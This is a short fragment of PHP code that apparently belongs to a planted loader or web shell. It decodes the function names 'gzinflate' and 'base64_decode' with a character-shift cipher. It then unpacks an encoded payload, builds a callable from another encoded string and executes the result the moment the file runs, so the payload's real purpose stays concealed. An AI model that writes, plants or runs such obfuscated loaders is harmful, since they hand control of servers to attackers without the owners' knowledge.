...
function LvfAOv($wSye){$GHUp=array('h{jogmbuf','cbtf75`efdpef',$wSye);for($ZJJ=0;$ZJJ<3;$ZJJ++){for($QrMR=0;$QrMR<strlen($GHUp[$ZJJ]);$QrMR++) $GHUp[$ZJJ][$QrMR] = chr(ord($GHUp[$ZJJ][$QrMR])-1);if($ZJJ==1) $GHUp[2]=$GHUp[0]($GHUp[1]($GHUp[2]));} return $GHUp[2];}$HYoLAt="y0rXzCopSSvVVE0IDAgJjVEurSrLUo7T0qpxLCxOy0goTivMTUpJ09QwiDdI09DVSNPQ1yhPykVXrqGrqJGUmqqhZZNWmVVqUwcA";$ayyt="LvfAOv";$daJx=$ayyt("SylOSypNS0gvy08pzSrIBwA");$snhYP=$daJx('',$ayyt($HYoLAt));$snhYP();